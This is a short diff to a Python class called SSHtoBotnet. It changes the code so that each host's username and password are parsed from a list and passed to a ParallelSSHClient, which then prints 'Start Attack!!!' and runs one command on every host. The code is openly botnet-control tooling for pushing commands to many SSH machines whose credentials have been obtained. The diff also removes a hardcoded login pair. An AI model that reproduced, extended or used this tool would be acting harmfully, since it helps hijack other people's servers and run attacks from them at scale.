@@ -9,9 +9,9 @@ class SSHtoBotnet:
             result = client.split("$")
             print(result[0])
             hosts.append(str(result[0]))
-        config.append(HostConfig(user=str(result[1]), password=str(result[2])))
+            config.append(HostConfig(user=str(result[1]), password=str(result[2])))
 
-        client = ParallelSSHClient(hosts,user='bach',password='2349567')
+        client = ParallelSSHClient(hosts,host_config=config)
 
         print("Start Attack!!!")
         client.run_command(command)
